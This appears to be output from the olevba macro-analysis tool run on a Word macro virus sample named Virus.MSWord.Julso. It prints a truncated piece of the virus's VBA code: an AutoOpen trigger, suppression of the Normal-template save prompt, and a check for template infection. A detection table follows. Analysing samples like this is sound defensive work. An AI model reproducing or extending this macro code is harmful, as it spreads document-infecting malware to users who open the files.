olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Julso
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Julso 
in file: Virus.MSWord.Julso - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#Const depurar = False
Public Const MacroName = "AutoOpen"
Public Const Version = 5
Public Sub Main()
Dim r As Boolean
Dim ret As String
Dim fechaInst As String
#If depurar Then
   unNombre = System.PrivateProfileString("", _
    "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Defname")
MsgBox unNombre
#End If
Options.SaveNormalPrompt = False
If CheckIt(NormalTemplate) = True Then
  #If depurar Then
    MsgBox "Plantilla Normal infectada"
  
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

